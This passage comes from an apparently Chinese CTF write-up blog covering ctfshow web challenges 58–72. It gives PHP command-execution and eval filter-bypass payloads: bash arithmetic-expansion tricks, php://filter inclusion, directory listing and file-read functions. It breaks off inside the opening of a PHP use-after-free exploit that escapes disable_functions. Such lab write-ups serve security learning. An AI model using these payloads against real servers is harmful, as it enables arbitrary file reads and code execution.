class="code"><pre><code class="hljs php"><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>解题思路：</p><p>未过滤$、取反~和左右括号()，提示flag在36.php中，文件名为数字，且程序会直接cat到指定文件内容，需要给c赋值为36。</p><p>可使用Bash shell中的双小括号(())来进行构造数字：</p><ul><li>$(()) 代表一次运算，括号内可以填入运算式，因为里面为空，所以结果会被解析为0</li><li>对0取反可以得到-1，使用表达式表示为$(( ~$(()) ))</li><li>两个双小括号运算符相连，默认为相加，如$(( $(~$(())) $(( ~$(()))) )) ，-1+(-1)&#x3D;-2</li><li>通过上述方法我们可以构造出-37，又-37取反得到36，目的达成，在$(( ~$((    )) ))中放入37个$(( ~$(()) ))，即可构造出数字36</li></ul><p>python脚本得到payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">payload = <span class="hljs-string">&quot;<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>((&#123;&#125;))))&quot;</span>.format(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))&quot;</span>*<span class="hljs-number">37</span>)<br>print(payload)<br><br><span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>((<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))))))<br><br></code></pre></td></tr></table></figure><hr><h2 id="web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight-file-、show-source-）"><a href="#web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight-file-、show-source-）" class="headerlink" title="web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight_file()、show_source()）"></a>web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight_file()、show_source()）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过include绕过过滤 本题对于passthru，system等命令执行函数都禁用了。eval在php里面是执行代码层面的函数，无法直接执行linux命令。因此为了绕过过滤就使用include加伪协议绕过、或者使用highlight_file()函数或者show_source()函数直接读取flag.php。</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">post：<br>include加伪协议<br>POST传参：<span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=flag.php<br><br>highlight_file()<br>POST传参：<span class="hljs-attribute">c</span>=highlight_file(&quot;flag.php&quot;);<br><br>show_source()<br><span class="hljs-attribute">c</span>=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><hr><h2 id="web-59（命令执行突破禁用函数）"><a href="#web-59（命令执行突破禁用函数）" class="headerlink" title="web-59（命令执行突破禁用函数）"></a>web-59（命令执行突破禁用函数）</h2><p>跟上题一样</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST传参：<span class="hljs-attribute">c</span>=highlight_file(&quot;flag.php&quot;);<br>POST传参：<span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=flag.php<br>或者<br><span class="hljs-attribute">c</span>=include <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;<br>POST传参：<span class="hljs-attribute">c</span>=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><hr><h2 id="web-60（命令执行突破禁用函数、扫描当前目录）"><a href="#web-60（命令执行突破禁用函数、扫描当前目录）" class="headerlink" title="web-60（命令执行突破禁用函数、扫描当前目录）"></a>web-60（命令执行突破禁用函数、扫描当前目录）</h2><p>应该也过滤了些函数，但是不知道过滤了啥，试了下file_get_contents被过滤了，但是上题的payload都能用，这里用一下扫描当前目录的payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">先扫描一下文件: <span class="hljs-attribute">c</span>=print_r(scandir(dirname(&#x27;FILE&#x27;)));<br><span class="hljs-attribute">c</span>=print_r(scandir(dirname(&#x27;.&#x27;)));<br>发现flag.php<br><br>然后读取flag.php，有以下几种方法<br>POST传参：<span class="hljs-attribute">c</span>=highlight_file(&quot;flag.php&quot;);<br>POST传参：<span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=flag.php<br><span class="hljs-attribute">c</span>=include <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;<br>POST传参：<span class="hljs-attribute">c</span>=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><hr><h2 id="web-61-64（同上）"><a href="#web-61-64（同上）" class="headerlink" title="web-61-64（同上）"></a>web-61-64（同上）</h2><hr><h2 id="web-65（无参数文件读取、include文件包含配合echo输出flag）"><a href="#web-65（无参数文件读取、include文件包含配合echo输出flag）" class="headerlink" title="web-65（无参数文件读取、include文件包含配合echo输出flag）"></a>web-65（无参数文件读取、include文件包含配合echo输出flag）</h2><p>这里用一下无参数文件读取和include包含加echo输出得到flag</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">无参数文件读取<br><span class="hljs-attribute">c</span><span class="hljs-operator">=</span>show_source(next(array_reverse(scandir(pos(localeconv())))))<span class="hljs-comment">;</span><br><br>include文件包含然后echo输出flag<br><span class="hljs-attribute">c</span><span class="hljs-operator">=</span>include(<span class="hljs-string">&quot;flag.php&quot;</span>)<span class="hljs-comment">;echo $flag;</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-66（根目录扫描、php原生类）"><a href="#web-66（根目录扫描、php原生类）" class="headerlink" title="web-66（根目录扫描、php原生类）"></a>web-66（根目录扫描、php原生类）</h2><p>源码还是一样，但是我们读取目录下的flag.php然后发现flag不在，所以这次我们得扫描下根目录，然后再读取</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs llvm">查看根目录内容<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br>或<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>print_r(scandir(dirname(&#x27;.&#x27;)))<span class="hljs-comment">;</span><br>或<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>var_dump(scandir(&#x27;/&#x27;))<span class="hljs-comment">;</span><br>或<br>新思路：PHP原生类可遍历目录 <span class="hljs-keyword">c</span><span class="hljs-operator">=</span>$dir<span class="hljs-operator">=</span>new DirectoryIterator(<span class="hljs-string">&quot;/&quot;</span>)<span class="hljs-comment">;echo $dir; (url编码：</span><br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%24</span>dir<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>DirectoryIterator(<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>aforeach(<span class="hljs-variable">%24</span>dir<span class="hljs-variable">%20</span>as<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>f)<span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>echo(<span class="hljs-variable">%24</span>f.&#x27;<span class="hljs-variable">%3</span>cbr<span class="hljs-variable">%3</span>e&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d)<br>扫描发现一个flag.txt<br><br><br>查看文件内容<br>POST传参：<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br>POST传参：<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>include($_POST[&#x27;w&#x27;])<span class="hljs-comment">;&amp;w=php://filter/convert.base64-encode/resource=/flag.txt</span><br>POST传参：<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;../../../../../flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-67（命令执行突破禁用函数）"><a href="#web-67（命令执行突破禁用函数）" class="headerlink" title="web-67（命令执行突破禁用函数）"></a>web-67（命令执行突破禁用函数）</h2><p>试了一下发现print_r()和show_source()被禁用了，用var_dump代替print_r，</p><p>highlight_file读取</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">查看根目录<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>var_dump(scandir(&#x27;/&#x27;))<span class="hljs-comment">;</span><br>或者<br>php原生类<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%24</span>dir<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>DirectoryIterator(<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>aforeach(<span class="hljs-variable">%24</span>dir<span class="hljs-variable">%20</span>as<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>f)<span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>echo(<span class="hljs-variable">%24</span>f.&#x27;<span class="hljs-variable">%3</span>cbr<span class="hljs-variable">%3</span>e&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d<br><br>读取文件<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;../../../../../flag.txt&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>include($_POST[&#x27;w&#x27;])<span class="hljs-comment">;&amp;w=php://filter/convert.base64-encode/resource=/flag.txt</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-68（命令执行突破禁用函数、readgzfile、splFileobject-fpassthru）"><a href="#web-68（命令执行突破禁用函数、readgzfile、splFileobject-fpassthru）" class="headerlink" title="web-68（命令执行突破禁用函数、readgzfile、splFileobject-&gt;fpassthru）"></a>web-68（命令执行突破禁用函数、readgzfile、splFileobject-&gt;fpassthru）</h2><p>这里点开发现highlight_file被禁用了，依然可以使用var_dump结合scandir来显示根目录的文件列表，然后这里可以用include和require</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查看根目录内容<br><span class="hljs-attribute">c</span>=var_dump(scandir(&quot;/&quot;));<br><br>查看文件内容<br>POST传参：<br><span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=/flag.txt<br><span class="hljs-attribute">c</span>=var_dump((new SplFileObject(<span class="hljs-string">&quot;/flag.txt&quot;</span>))-&gt;fpassthru());<br><span class="hljs-attribute">c</span>=readgzfile(&quot;/flag.txt&quot;);<br></code></pre></td></tr></table></figure><hr><h2 id="web-69（命令执行突破禁用函数、implode、var-export、json-encode）"><a href="#web-69（命令执行突破禁用函数、implode、var-export、json-encode）" class="headerlink" title="web-69（命令执行突破禁用函数、implode、var_export、json_encode）"></a>web-69（命令执行突破禁用函数、implode、var_export、json_encode）</h2><p>implode函数：将数组转换成字符串再打印</p><p>var_export：类似var_dump</p><p>json_encode() 函数：将数组转换为 JSON 格式的字符串，可以用于在前端或其他系统中传递和处理数组数据。</p><p>解题思路：</p><p><strong>前面几题用到的打印数组函数 print_r() 和 var_dump() 已被禁用，但是还有几种能打印数组的函数</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查看根目录内容<br><span class="hljs-attribute">c</span>=echo json_encode(scandir(<span class="hljs-string">&quot;/&quot;</span>)); <br><span class="hljs-attribute">c</span>=echo(implode(&quot;--&quot;,scandir(&quot;/&quot;)));<br><span class="hljs-attribute">c</span>=var_export(scandir(&quot;/&quot;));<br><br>查看文件内容<br>POST传参：<br><span class="hljs-attribute">c</span>=readgzfile(&#x27;/flag.txt&#x27;);<br><span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=/flag.txt<br><span class="hljs-attribute">c</span>=include(&quot;/flag.txt&quot;);<br></code></pre></td></tr></table></figure><hr><h2 id="web-70（同上）"><a href="#web-70（同上）" class="headerlink" title="web-70（同上）"></a>web-70（同上）</h2><p>上一关的var_export等函数依然可用</p><hr><h2 id="web-71（正则替换绕过、提前送出缓冲区或终止程序、ob-flush-、ob-end-flush、exit、die）"><a href="#web-71（正则替换绕过、提前送出缓冲区或终止程序、ob-flush-、ob-end-flush、exit、die）" class="headerlink" title="web-71（正则替换绕过、提前送出缓冲区或终止程序、ob_flush()、ob_end_flush、exit、die）"></a>web-71（正则替换绕过、提前送出缓冲区或终止程序、ob_flush()、ob_end_flush、exit、die）</h2><p>我们首先使用上一题的查看根目录的payload发现，输出全是?，猜测是源码内有替换语句。</p><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br></code></pre></td></tr></table></figure><p>源码劫持了输出缓冲并且将数字和字母替换成了<code>?</code>。</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">exit</span>();<br>法一<br>在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：<br>ob_flush();<br>ob_end_flush();<br>payload示例：<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);ob_flush();<br><br>法二<br>提前终止程序，即执行完代码直接退出，可以调用的函数有：<br><span class="hljs-keyword">exit</span>();<br>die();<br>payload示例：<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><hr><h2 id="web-72（暂时还看不懂、open-basedir限制绕过、脚本uaf）"><a href="#web-72（暂时还看不懂、open-basedir限制绕过、脚本uaf）" class="headerlink" title="web-72（暂时还看不懂、open_basedir限制绕过、脚本uaf）"></a>web-72（暂时还看不懂、open_basedir限制绕过、脚本uaf）</h2><p><strong>暂时还看不懂</strong></p><p>找到flag0.txt 利用脚本uaf绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-<br>&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>   <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>   <br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>   <br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>   <br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span 